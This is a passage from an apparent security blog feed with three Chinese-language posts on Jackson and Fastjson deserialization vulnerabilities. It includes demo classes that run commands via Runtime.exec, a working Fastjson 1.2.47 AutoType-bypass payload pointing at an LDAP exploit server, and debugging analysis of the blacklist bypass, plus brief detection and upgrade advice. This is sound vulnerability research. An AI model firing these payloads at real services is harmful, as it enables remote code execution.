(com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:11, JSTest</span><br></pre></td></tr></table></figure><p>调用到MySex类sex属性的setter方法时的函数调用栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">setSex:17, MySex (com.mi1k7ea)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">deserializeAndSet:97, MethodProperty (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromObject:58, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:142, AbstractDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:493, SettableBeanProperty (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserializeAndSet:101, FieldProperty (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:11, JSTest</span><br></pre></td></tr></table></figure><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p><strong>在Jackson反序列化中，若调用了enableDefaultTyping()函数或使用@JsonTypeInfo注解指定反序列化得到的类的属性为JsonTypeInfo.Id.CLASS或JsonTypeInfo.Id.MINIMAL_CLASS，则会调用该属性的类的构造函数和setter方法。</strong></p><h2 id="0x05-Jackson反序列化漏洞"><a href="#0x05-Jackson反序列化漏洞" class="headerlink" title="0x05 Jackson反序列化漏洞"></a>0x05 Jackson反序列化漏洞</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>满足下面三个条件之一即存在Jackson反序列化漏洞：</p><ul><li>调用了ObjectMapper.enableDefaultTyping()函数；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解；</li></ul><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由之前的结论知道，当使用的JacksonPolymorphicDeserialization机制配置有问题时，Jackson反序列化就会调用属性所属类的构造函数和setter方法。</p><p>而如果该构造函数或setter方法存在危险操作，那么就存在Jackson反序列化漏洞。</p><h3 id="漏洞场景及Demo"><a href="#漏洞场景及Demo" class="headerlink" title="漏洞场景及Demo"></a>漏洞场景及Demo</h3><p>这里大致以要进行反序列化的类的属性所属的类的类型分为两种：</p><h4 id="属性不为Object类时"><a href="#属性不为Object类时" class="headerlink" title="属性不为Object类时"></a>属性不为Object类时</h4><p><strong>当要进行反序列化的类的属性所属类的构造函数或setter方法本身存在漏洞时，这种场景存在Jackson反序列化漏洞。当然这种场景开发几乎不会这么写。</strong></p><p>我们看个例子，直接修改MySex类的setSex()方法，在其中添加命令执行操作（除非程序员自己想留后门、不然不会出现这种写法）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MySex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"MySex构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"MySex.getSex"</span>);</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"MySex.setSex"</span>);</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, sex == <span class="keyword">null</span> ? <span class="string">"null"</span> : sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JSTest.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"&#123;\"age\":6,\"name\":\"mi1k7ea\",\"sex\":[\"com.mi1k7ea.MySex\",&#123;\"sex\":1&#125;]&#125;"</span>;</span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可弹计算器：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/22.png" alt=""></p><h4 id="属性为Object类时"><a href="#属性为Object类时" class="headerlink" title="属性为Object类时"></a>属性为Object类时</h4><p><strong>当属性类型为Object时，因为Object类型是任意类型的父类，因此扩大了我们的攻击面，我们只需要寻找出在目标服务端环境中存在的且构造函数或setter方法存在漏洞代码的类即可进行攻击利用。</strong></p><p>后面出现的Jackson反序列化的CVE漏洞、黑名单绕过等都是基于这个原理寻找各种符合条件的利用链而已。</p><p>这里我们假设目标服务端环境中存在其一个恶意类Evil，其setter方法存在任意代码执行漏洞，存在于com.evil包中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    String cmd;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">this</span>.cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person类，将sex属性改为object属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JSTest.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"&#123;\"age\":6,\"name\":\"mi1k7ea\",\"object\":[\"com.evil.Evil\",&#123;\"cmd\":\"calc\"&#125;]&#125;"</span>;</span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/23.png" alt=""></p><hr><p>OK，Jackson反序列化漏洞相关的一些基本概念都说到了，后面的几篇文章就分别对Jackson反序列化的几个CVE漏洞以及不同的利用链进行分析。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson系列五——高版本JDK绕过及检测与防御</title>
    <link href="https://www.mi1k7ea.com/2019/11/13/Fastjson%E7%B3%BB%E5%88%97%E4%BA%94%E2%80%94%E2%80%94%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%BB%95%E8%BF%87%E5%8F%8A%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
    <id>https://www.mi1k7ea.com/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/</id>
    <published>2019-11-13T13:44:51.000Z</published>
    <updated>2019-11-13T14:54:20.056Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-高版本JDK绕过"><a href="#0x01-高版本JDK绕过" class="headerlink" title="0x01 高版本JDK绕过"></a>0x01 高版本JDK绕过</h2><p>由之前利用的PoC知道，利用范围最广的PoC是基于com.sun.rowset.JdbcRowSetImpl的利用链的，而这种利用方式是基于JNDI注入漏洞的，是需要我们有RMI服务或LDAP服务。</p><p>这样就会导致一个限制的问题，即JNDI注入漏洞利用的限制问题——JDK版本。</p><p>由之前的分析知道，JDK对于JNDI注入漏洞在不同版本有着不同的防御措施：</p><ul><li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li><li>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li><li>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li></ul><p>因此，相比之下，我们在Fastjson反序列化漏洞的基于com.sun.rowset.JdbcRowSetImpl的利用链上，更倾向于使用LDAP服务来实现攻击利用，因为其对于JDK的适用范围更广。</p><p>但是如果目标环境的JDK版本在6u211、7u201、8u191之后，我们是不是就没有办法绕过了呢？</p><p>当然是有的，KINGX大佬已经写：<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">如何绕过高版本JDK的限制进行JNDI注入利用</a></p><p>主要是有两种方式：</p><ul><li>利用本地Class作为Reference Factory</li><li>利用LDAP返回序列化数据，触发本地Gadget</li></ul><p>这一块有时间我再补充下。。。</p><h2 id="0x02-检测方法"><a href="#0x02-检测方法" class="headerlink" title="0x02 检测方法"></a>0x02 检测方法</h2><p>全局搜索是否使用到了Fastjson，若使用了则进一步排查是否为漏洞版本号即1.2.22-1.2.47，若是则可能存在反序列化漏洞的风险，需进一步排查。</p><p>全局搜索如下关键代码，若存在则进一步排查参数是否外部可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line">JSON.parse(</span><br><span class="line">JSON.parseObject(</span><br></pre></td></tr></table></figure><h2 id="0x03-防御方法"><a href="#0x03-防御方法" class="headerlink" title="0x03 防御方法"></a>0x03 防御方法</h2><p>升级到最新版的Fastjson。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</title>
    <link href="https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/</id>
    <published>2019-11-11T13:54:53.000Z</published>
    <updated>2019-11-12T16:41:37.217Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Fastjson 1.2.x系列的1.2.25-1.2.47版本。</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>主要是JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。</p><h2 id="0x03-复现利用"><a href="#0x03-复现利用" class="headerlink" title="0x03 复现利用"></a>0x03 复现利用</h2><p>本次Fastjson反序列化漏洞也是基于checkAutoType()函数绕过的，并且无需开启AutoTypeSupport，大大提高了成功利用的概率。</p><p>绕过的大体思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p><p>Demo如下，无需开启AutoTypeSupport，本地Fastjson用的是1.2.47版本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        String payload  = <span class="string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,"</span></span><br><span class="line">                + <span class="string">"\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span></span><br><span class="line">                + <span class="string">"\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true&#125;&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，还需要开启RMI服务或LDAP服务以及放置恶意类的Web服务，具体可参考之前的Fastjson系列文章即可。</p><p>运行能成功弹计算器：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/1.png" alt=""></p><p>这里，我们看看PoC是怎么写的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。</p><p>但是如果目标服务端开启了AutoTypeSupport呢？经测试发现：</p><ul><li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li><li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li></ul><h2 id="0x04-调试分析"><a href="#0x04-调试分析" class="headerlink" title="0x04 调试分析"></a>0x04 调试分析</h2><p>下面我们来调试分析下该PoC为啥会成功。</p><h3 id="不受AutoTypeSupport影响的版本"><a href="#不受AutoTypeSupport影响的版本" class="headerlink" title="不受AutoTypeSupport影响的版本"></a>不受AutoTypeSupport影响的版本</h3><p>不受AutoTypeSupport影响的版本为1.2.33-1.2.47，本次调试的是1.2.47版本。</p><h4 id="未开启AutoTypeSupport时"><a href="#未开启AutoTypeSupport时" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>在调用DefaultJSONParser.parserObject()函数时，其会对JSON数据进行循环遍历扫描解析。</p><p>在第一次扫描解析中，进行checkAutoType()函数，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；由于@type执行java.lang.Class类，该类在接下来的findClass()函数中直接被找到，并在后面的if判断clazz不为空后直接返回：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/2.png" alt=""></p><p>往下调试，调用到MiscCodec.deserialze()，其中判断键是否为”val”，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/3.png" alt=""></p><p>接着判断clazz是否为Class类，是的话调用TypeUtils.loadClass()加载strVal变量值指向的类：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/4.png" alt=""></p><p>在TypeUtils.loadClass()函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/5.png" alt=""></p><p>在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/6.png" alt=""></p><h4 id="开启AutoTypeSupport时"><a href="#开启AutoTypeSupport时" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h4><p>由前面知道，开启AutoTypeSupport后，在checkAutoType()函数中会进入黑白名单校验的代码逻辑。</p><p>在第一部分JSON数据的扫描解析中，由于@type指向java.lang.Class，因此即使是开启AutoTypeSupport先后进行白名单、黑名单校验的情况下都能成功通过检测，之后和前面的一样调用findClass()函数获取到Class类：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/7.png" alt=""></p><p>关键在于第二部分JSON数据的扫描解析。第二部分的@type指向的是利用类”com.sun.rowset.JdbcRowSetImpl”，其中的”com.sun.”是在denyList黑名单中的，但是为何在检测时能成功绕过呢？</p><p>我们调试发现，逻辑是先进行白名单再进行黑名单校验，在黑名单校验的if判断条件中是存在两个必须同时满足的条件的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br></pre></td></tr></table></figure><p>第一个判断条件<code>Arrays.binarySearch(denyHashCodes, hash) &gt;= 0</code>是满足的，因为我们的@type包含了黑名单的内容；关键在于第二个判断条件<code>TypeUtils.getClassFromMapping(typeName) == null</code>，这里由于前面已经将com.sun.rowset.JdbcRowSetImpl类缓存在Map中了，也就是说该条件并不满足，导致能够成功绕过黑名单校验、成功触发漏洞。</p><h3 id="受AutoTypeSupport影响的版本"><a href="#受AutoTypeSupport影响的版本" class="headerlink" title="受AutoTypeSupport影响的版本"></a>受AutoTypeSupport影响的版本</h3><p>受AutoTypeSupport影响的版本为1.2.25-1.2.32，本次调试的是1.2.25版本。</p><h4 id="开启AutoTypeSupport时-1"><a href="#开启AutoTypeSupport时-1" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h4><p>我们在开启AutoTypeSupport之后，会利用失败，报如下错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure><p>调试发现，在第一部分JSON数据的解析中，checkAutoType()函数的处理过程和前面是差不多的。能够成功通过该函数的检测，因此问题不在这，继续往下调试。</p><p>在第二部分JSON数据的解析中，@type指向的”com.sun.rowset.JdbcRowSetImpl”在checkAutoType()函数中会被dentList黑名单中的”com.sun.”匹配到，因此会直接报错显示不支持：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/8.png" alt=""></p><p>可以明显看到，第一个if语句是白名单过滤，第二个if语句是黑名单过滤，其中黑名单过滤的if语句中的判断条件和前面的不受影响的版本的不一样，对比下是少了个判断条件，即<code>TypeUtils.getClassFromMapping(typeName) == null</code>。</p><h4 id="未开启AutoTypeSupport时-1"><a href="#未开启AutoTypeSupport时-1" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>当不开启AutoTypeSupport时就不会进入该黑白名单校验的代码逻辑中，就不会被过滤报错。</p><p>这里，我们换个不受AutoTypeSupport影响的且未使用哈希黑名单的版本来方便我们进行对比查看，这里选了1.2.33，看下checkAutoType()中对应的代码：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/9.png" alt=""></p><p>对比黑名单校验的if判断语句条件就知道了，为什么后面的版本不受影响，那是因为通过<code>&amp;&amp;</code>多添加了一个判断条件<code>TypeUtils.getClassFromMapping(typeName) == null</code>，但是第二部分JSON内容中的类已经通过第一部分解析的时候加载到Map中缓存了，因此该条件不成立从而成功绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny) &amp;&amp; 